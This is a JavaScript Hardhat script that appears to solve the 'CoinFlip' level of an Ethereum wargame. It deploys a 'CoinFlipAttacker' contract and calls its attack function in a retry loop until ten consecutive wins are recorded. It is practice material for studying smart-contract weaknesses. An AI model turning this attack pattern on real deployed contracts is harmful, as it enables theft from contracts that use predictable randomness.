const {
    COIN_FLIP_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink,
} = require('./utils');

const MAX_SPLIT_COUNT = 10;

async function main(levelName) {
    logStartingLevel(levelName);

    if (!COIN_FLIP_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, COIN_FLIP_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("CoinFlip");
    const contract = factory.attach(COIN_FLIP_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("CoinFlipAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address);
    await attackerContract.deployed();

    await splitCoin(contract, attackerContract);

    logSuccessfullyLevel(levelName);
}

async function splitCoin(contract, attackerContract) {
    try {
        const consecutiveWins = await contract.consecutiveWins();
        const count = MAX_SPLIT_COUNT - consecutiveWins;
        let tx;

        console.log('need run attack count: ', count);
        for (let i = 1; i <= count; i++) {
            console.log(`Performing attack #${i}...`);
            tx = await attackerContract.attack();
            logTransactionLink(tx.hash);
            await tx.wait(1);
        }
    } catch (e) {
        console.log('Has a transaction error');
        console.log('Let me retry...');

        await splitCoin(contract, attackerContract);
    }
}

module.exports = main;
